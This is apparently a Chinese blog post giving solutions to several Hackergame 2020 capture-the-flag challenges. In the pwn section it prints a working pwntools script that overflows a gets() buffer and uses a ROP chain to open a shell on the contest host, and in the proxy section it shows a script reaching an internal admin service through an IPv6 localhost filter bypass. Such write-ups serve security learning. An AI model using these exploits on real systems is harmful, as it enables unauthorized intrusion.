---
title: Hackergame2020部分题解
date: 2020-11-08 21:59:25
tags:
- ctf
- hack
---

总的来说这场比赛游戏体验良好，学习到了许多新的知识

<!--more-->

# 签到

第一题签到题

直接`F12`开发者工具定位到滑动条，将`step`调整为`0.5`然后拖动到`1`得到`flag`

<img src="/images/hackergame2020-1.png" alt="checkin">

# 猫咪问答++

> 1. 以下编程语言、软件或组织对应标志是哺乳动物的有几个？
>    Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.

这道题怎么说，答案是`12`但是我怎么都数不到，最后用`Burpsuite`爆破解决

> 2. 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？

这个比较有意思，搜索可以找到[文档](https://tools.ietf.org/html/rfc1149)，得到答案`256`

> 3. USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？

找到活动[链接](https://lug.ustc.edu.cn/wiki/lug/events/sfd/)，发现介绍的开源游戏为`Teeworlds`共`9`个字母

> 4. 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？

百度地图街景模式，共`9`个

> 5. 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？

找到[新闻](https://news.ustclug.org/2019/12/hackergame-2019/)，共计`17098`次

# 2048

~~游戏挺好玩的~~

直接`F12`审计代码

<img src="/images/hackergame2020-2.png" alt="2048">

发现`html_actuator.js`中有关键内容`"/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();`，丢到下方的`console`中计算得到网址，发送请求后得到`flag`

# 一闪而过的 Flag

很基础，在命令提示符里打开

# 从零开始的记账工具人

我的做法和官方题解`解法2`一样，进行字符替换

```
'零' -> ''
'壹' -> '1'
'贰' -> '2'
'叁' -> '3'
'肆' -> '4'
'伍' -> '5'
'陆' -> '6'
'柒' -> '7'
'捌' -> '8'
'玖' -> '9'
'拾' -> '*10+'
'佰' -> '*100+'
'仟' -> '*1000+'
'元' -> '+'
'角' -> '/10+'
'分' -> '/100'
'++' -> '+'
'整' -> ''
```

然后求值求和

# 超简单的世界模拟器

这个我只做出了第一问，去维基百科上搜索，康威生命游戏，然后构造一个滑翔机模型，可以打掉一个点

```
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
010010000000000
000001000000000
010001000000000
001111000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
```

# 自复读的复读机

这一类复读程序有一个名词`Quine`

经过简单搜索可以得出`payload`

```python
# 逆序复读
x='x=%r;print((x%%x)[::-1],end=)';print((x%x)[::-1],end=)
# 哈希
r='r=%r;import hashlib;s=hashlib.sha256();s.update((r%%r).encode("ascii"));print(s.hexdigest(),end="")';import hashlib;s=hashlib.sha256();s.update((r%r).encode("ascii"));print(s.hexdigest(),end="")
```

这里需要注意的是判题程序会判断换行符，要注意使用`end=""`去除换行符

# 233 同学的字符串工具

第一问字符串大写工具

题目的突破口在于`.upper()`函数，我们要构造一个字符串，其通过`.upper()`后能改变原来的字符类型以此绕过`regex`

先查询[文档](https://docs.python.org/zh-cn/3/library/stdtypes.html?highlight=upper#str.upper)

> 返回原字符串的副本，其中所有区分大小写的字符 [4](https://docs.python.org/zh-cn/3/library/stdtypes.html?highlight=upper#id15) 均转换为大写。 请注意如果 `s` 包含不区分大小写的字符或者如果结果字符的 Unicode 类别不是 "Lu" (Letter, uppercase) 而是 "Lt" (Letter, titlecase) 则 `s.upper().isupper()` 有可能为 `False`。

发现关键内容`Unicode 类别`，`Lu`，`Lt`，这里说明要从`Unicode`开始突破

经过搜索`Unicode`官方文档找到了一个[文档](https://unicode.org/Public/UNIDATA/SpecialCasing.txt)，其给出了特殊的大小写转换规则

刚刚好我们发现了一个拉丁文连字`FL`:

> FB02; FB02; 0046 006C; 0046 004C; # LATIN SMALL LIGATURE FL

于是我们用`FB02`去替代`flag`里面的`fl`，这样就能绕过正则限制并且`upper`后得到`flag`

第二问`UTF-7`转换工具

这个我个人感觉比前一问容易，搜索`UTF-7`编码规则发现其可以用`base64`编码，稍微构造一下可得`+AGYAbABhAGc-`经过`UTF-7`解码后正是`flag`

# 233 同学的 Docker

也是基础题，考察了`Docker`的分层打包机制

这里介绍一个工具[dive](https://github.com/wagoodman/dive)

首先使用`Dive`查看镜像：

执行命令：` docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest 8b8d3c8324c7/stringtool`

<img src="/images/hackergame2020-3.png" alt="dive">

发现`image`构建过程中在有一步是删除了`flag.txt`

由于我的`Docker`部署在`WSL2`里面，不方便直接查看镜像文件，所以使用`docker image save`命令把镜像导出

我们回到上一步`COPY`发现镜像

`Id: c319bce601a5672aa9ff8297cfde8f65479a58857c1da43f6cd764df62116d9d`

我们在前面导出的数据中找到

`c319bce601a5672aa9ff8297cfde8f65479a58857c1da43f6cd764df62116d9d`目录，

目录下`layer.tar`里面就有我们要的`flag.txt`

# 来自一教的图片

题目里加粗提示了**傅里叶**

直接搜索`图像 傅里叶变换`找到一个`CSDN`[教程](https://blog.csdn.net/Ibelievesunshine/article/details/104984775)

使用代码:

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
img = cv.imread('4f_system_middle.bmp', 0)
f = np.fft.fft2(img)
logf = 20*np.log(np.abs(f))
plt.imshow(logf, 'gray')
plt.show()
```

运行后得到结果

<img src="/images/hackergame2020-4.png" alt="fft">

稍微平移拼接一下得到了`flag`

# 超简陋的 OpenGL 小程序

说实话我并不了解`OpenGL`等图形学内容，但是题目给了`basic_lighting.vs`文件，看起来内容像是`C`于是随便改了一下：

```c
#version 330 core
layout (location = 0) in vec3 aPos;
layout (location = 1) in vec3 aNormal;

out vec3 FragPos;
out vec3 Normal;

uniform mat4 model;
uniform mat4 view;
uniform mat4 projection;

void main()
{
    //FragPos = vec3(model * vec4(aPos, 1.0))
    FragPos = vec3(model * vec4(-aPos, 1.0));
    Normal = aNormal;
    //gl_Position = projection * view * vec4(FragPos, 1.0);
    gl_Position = projection * view * vec4(FragPos, 1.0) + vec4(1,2,0,0);
}
```

然后借助画图工具翻转一下看到`flag`为`flag{glGraphicsHappy(233);}`

<img src="/images/hackergame2020-5.png" alt="opengl">

# 生活在博弈树上

这个题目就是`pwn`题，审计源码可以发现不安全函数`gets`。

## 始终热爱大地

直接`IDA`一把梭打开程序

<img src="/images/hackergame2020-6.1.png" alt="love">

我们发现`gets`读取数据并存放于`v12`，最后判断输赢的变量存放于`v15`

而它们具体在哪里？

<img src="/images/hackergame2020-6.2.png" alt="love">

向上翻可以看到`v12`存放于`rbp-90h`处，`v15`存放于`rbp-1h`处，所以我们可以直接构造一个超长字符串使得`rbp-1h`被覆盖为`0x1`

## 升上天空

题目的意思很明显了，`main`函数没有开启`canary`，我们要覆盖掉`rbp`来`getshell`

注意到程序是静态链接的，直接使用`ROPgadget`工具获取`ROP`链来构造`syscall`

执行命令：

> ROPgadget --binary tictactoe --ropchain

我们把`step - 5`中构造的`ROPchain`拿来修改一下，加上前面`0x90h`的填充

```python
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

from pwn import *
from struct import pack

#target = process('./tictactoe')
target = remote('202.38.93.111', 10141)

# Padding goes here
#p = ''

p = ('1' * 143).encode('ascii')
# 第一问
p += b'\x01'
p += ('1' * 8).encode('ascii')

# 第二问
p += pack('<Q', 0x0000000000407228)  # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e0)  # @ .data
p += pack('<Q', 0x000000000043e52c)  # pop rax ; ret
p += '/bin//sh'.encode('ascii')
p += pack('<Q', 0x000000000046d7b1)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000407228)  # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8)  # @ .data + 8
p += pack('<Q', 0x0000000000439070)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000046d7b1)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017b6)  # pop rdi ; ret
p += pack('<Q', 0x00000000004a60e0)  # @ .data
p += pack('<Q', 0x0000000000407228)  # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8)  # @ .data + 8
p += pack('<Q', 0x000000000043dbb5)  # pop rdx ; ret
p += pack('<Q', 0x00000000004a60e8)  # @ .data + 8
p += pack('<Q', 0x0000000000439070)  # xor rax, rax ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402bf4)  # syscall

target.recvuntil(':')

target.sendline(
    '144:MEUCIQCGhHgBSLuiv2VMiC2WbvpaBTaUVbKt/UeFDyZ4AY4IKAIgP3mG7PCCKwxX3drRjkbwUlLex7rwNoqoOeUWAejFGWg=')
target.recvuntil(':')

target.sendline(p)
target.interactive()
```

最后执行效果：

<img src="/images/hackergame2020-6.3.png" alt="pwn">

# 超安全的代理服务器

我的做法和官方题解不太一样，我要充分榨干浏览器的功能:smile:

## 找到secret

使用谷歌浏览器自带的`net-export`功能

<img src="/images/hackergame2020-7.png" alt="net-export">

开启记录后我们用[这个工具](https://netlog-viewer.appspot.com/)查看一下我们的访问记录

<img src="/images/hackergame2020-7.1.png" alt="net-log">

发现了一个神秘地址，拼接后访问可以看到

> Notice: secret: 7374a29dc1 ! Please use this secret to access our proxy.(flag1: flag{d0_n0t_push_me} )

## 入侵管理中心

这个题目写的比较变态，`secret`60秒过期，要么拼手速要么写脚本

查看帮助发现管理中心地址为`127.0.0.1:8080`而过滤了`ip`和域名访问，于是尝试使用`IPv6`地址来绕过：`[::1]:8080`

最后写一个`python`脚本配合`net-export`和`curl`

参考代码：

```python
import requests
import os
from hyper import HTTPConnection
from hyper.contrib import HTTP20Adapter

# flag2: flag{c0me_1n_t4_my_h0use}

# 使用以下命令安装工具
# pip3 install -U git+https://github.com/Lukasa/hyper.git

f = open('chrome-net-export-log.json', 'r', encoding='utf-8')
data = f.read()
token = data.split(
    '{"params":{"headers":[":method: GET",":scheme: https",":authority: 146.56.228.227",":path: /')[1]
token = token[:36]
print(token)

s = requests.Session()
s.mount('https://146.56.228.227', HTTP20Adapter())
r = s.get('https://146.56.228.227/'+token, verify=False)
content = r.content.decode('utf-8')

sec = content.split('secret: ')[1]
sec = sec[:11]
print(sec)

cmd = 'curl -v --proxytunnel --proxy-insecure -x https://146.56.228.227 --proxy-header \"Secret: '
cmd += sec
cmd += '\" -H \"Referer: 146.56.228.227\" \"http://[::1]:8080\"'

os.system(cmd)

```

# 不经意传输

这个只会第一问送分题

## 解密消息

题目告知了我们`m0_1`，而`m0_1`是通过`m0`和一个我们可以控制的`pow`计算而得

我们不妨令`v-x0 = 1`那么输出的`m0_`就是`m0+1`了由此可以轻易计算出`m0`拿到第一个`flag`